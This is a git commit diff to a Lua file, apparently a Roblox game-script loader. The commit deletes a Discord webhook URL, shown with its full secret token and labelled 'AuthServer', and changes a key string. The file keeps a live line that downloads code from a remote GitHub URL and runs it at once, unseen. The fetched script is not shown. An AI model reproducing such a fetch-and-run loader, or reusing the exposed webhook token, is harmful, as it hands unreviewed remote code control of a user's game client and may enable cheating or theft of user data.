6c6ce1a47a0713916788b8c7f1a4fd247fea8e69
Extremescripted <120589176+Extremescripted@users.noreply.github.com>
2022-12-18 14:36:18 +0100

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,3 +1,2 @@
-_G.Key = "9_orBebyaM"
-_G.AuthServer = "https://discord.com/api/webhooks/1053748287653560381/umPz9czdJwQZ1494u8Rnr4ZU8aHhBJhxHtRlVbCrfBKbHPRwetVFet-Bvo_8UuRwcyYc"
+_G.Key = "(9_orBebyaM)"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
